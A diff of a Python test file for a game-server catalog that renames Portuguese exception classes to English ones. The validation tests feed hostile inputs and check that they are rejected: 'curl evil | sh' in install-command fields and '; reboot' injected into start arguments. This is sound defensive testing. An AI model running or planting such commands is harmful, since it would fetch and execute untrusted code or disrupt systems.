@@ -7,7 +7,7 @@ from pathlib import Path
 import pytest
 
 import gamebroker.services.catalog as cat
-from gamebroker.domain.exceptions import Conflito, ErroDeValidacao, NaoEncontrado
+from gamebroker.domain.exceptions import Conflict, NotFound, ValidationError
 
 RAIZ = Path(__file__).resolve().parent.parent.parent
 
@@ -124,7 +124,7 @@ CASOS_INVALIDOS = [
 @pytest.mark.parametrize(("campo", "valor"), CASOS_INVALIDOS, ids=lambda v: repr(v)[:30])
 def test_campo_invalido_e_recusado(dados_de_jogo, campo, valor):
     dados_de_jogo[campo] = valor
-    with pytest.raises(ErroDeValidacao) as erro:
+    with pytest.raises(ValidationError) as erro:
         cat.validate_dynamic(dados_de_jogo)
     assert campo in str(erro.value)
 
@@ -137,7 +137,7 @@ def test_campo_invalido_e_recusado(dados_de_jogo, campo, valor):
 def test_deslocavel_exige_que_o_jogo_receba_todas_as_portas(dados_de_jogo, mudancas, trecho):
     """Sem isso o firewall abriria uma porta que o jogo nao escuta (ou uma que ele ignora)."""
     dados_de_jogo.update(mudancas)
-    with pytest.raises(ErroDeValidacao, match="deslocavel") as erro:
+    with pytest.raises(ValidationError, match="deslocavel") as erro:
         cat.validate_dynamic(dados_de_jogo)
     assert trecho in str(erro.value)
 
@@ -159,27 +159,27 @@ def test_jogo_curado_deslocavel_sem_marcador_vira_erro_do_catalogo(tmp_path):
 @pytest.mark.parametrize("campo", ["pre_install_cmd", "post_install_cmd", "provision_script", "PRE_INSTALL_CMD", "x"])
 def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(dados_de_jogo, campo):
     dados_de_jogo[campo] = "curl evil | sh"
-    with pytest.raises(ErroDeValidacao, match="desconhecido"):
+    with pytest.raises(ValidationError, match="desconhecido"):
         cat.validate_dynamic(dados_de_jogo)
 
 
 @pytest.mark.parametrize("corpo", [None, [], "texto", 7])
 def test_corpo_que_nao_e_objeto_e_recusado(corpo):
-    with pytest.raises(ErroDeValidacao, match="objeto JSON"):
+    with pytest.raises(ValidationError, match="objeto JSON"):
         cat.validate_dynamic(corpo)
 
 
 @pytest.mark.parametrize("campo", ["chave", "nome", "app_id", "portas", "porta_jogo"])
 def test_campo_obrigatorio_ausente(dados_de_jogo, campo):
     del dados_de_jogo[campo]
-    with pytest.raises(ErroDeValidacao, match="obrigatorio"):
+    with pytest.raises(ValidationError, match="obrigatorio"):
         cat.validate_dynamic(dados_de_jogo)
 
 
 def test_jogo_de_windows_exige_receita_de_windows(dados_de_jogo):
     dados_de_jogo["plataforma"] = "windows"
     dados_de_jogo["receitas"] = []
-    with pytest.raises(ErroDeValidacao, match="wine"):
+    with pytest.raises(ValidationError, match="wine"):
         cat.validate_dynamic(dados_de_jogo)
     dados_de_jogo["receitas"] = ["wine"]
     assert cat.validate_dynamic(dados_de_jogo).recipes == ("wine",)
@@ -207,19 +207,19 @@ def test_adicionar_persiste_e_sobrevive_a_recarga(catalog, dados_de_jogo, tmp_pa
 
 def test_adicionar_chave_de_jogo_curado_e_conflito(catalog, dados_de_jogo):
     dados_de_jogo["chave"] = "alfa"
-    with pytest.raises(Conflito):
+    with pytest.raises(Conflict):
         catalog.add_dynamic(dados_de_jogo)
 
 
 def test_adicionar_duas_vezes_e_conflito(catalog, dados_de_jogo):
     catalog.add_dynamic(dados_de_jogo)
-    with pytest.raises(Conflito):
+    with pytest.raises(Conflict):
         catalog.add_dynamic(dados_de_jogo)
 
 
 def test_jogo_recusado_nao_deixa_arquivo(catalog, dados_de_jogo, tmp_path):
     dados_de_jogo["start_args"] = "; reboot"
-    with pytest.raises(ErroDeValidacao):
+    with pytest.raises(ValidationError):
         catalog.add_dynamic(dados_de_jogo)
     assert list((tmp_path / "dinamico").glob("*")) == []
 
@@ -231,7 +231,7 @@ def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalog, dados_de_jogo, tmp_p
     adulterado["pre_install_cmd"] = "curl evil | sh"
     arquivo.write_text(json.dumps(adulterado))
     outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
-    with pytest.raises(NaoEncontrado):
+    with pytest.raises(NotFound):
         outro.get("meujogo")
     assert any("meujogo.json" in e for e in outro.errors)
 
@@ -240,10 +240,10 @@ def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalog, dados_de_jogo, 
     catalog.add_dynamic(dados_de_jogo)
     (tmp_path / "dinamico" / "meujogo.json").rename(tmp_path / "dinamico" / "outro.json")
     outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
-    with pytest.raises(NaoEncontrado):
+    with pytest.raises(NotFound):
         outro.get("meujogo")
 
 
 def test_jogo_desconhecido(catalog):
-    with pytest.raises(NaoEncontrado):
+    with pytest.raises(NotFound):
         catalog.get("nao-existe")
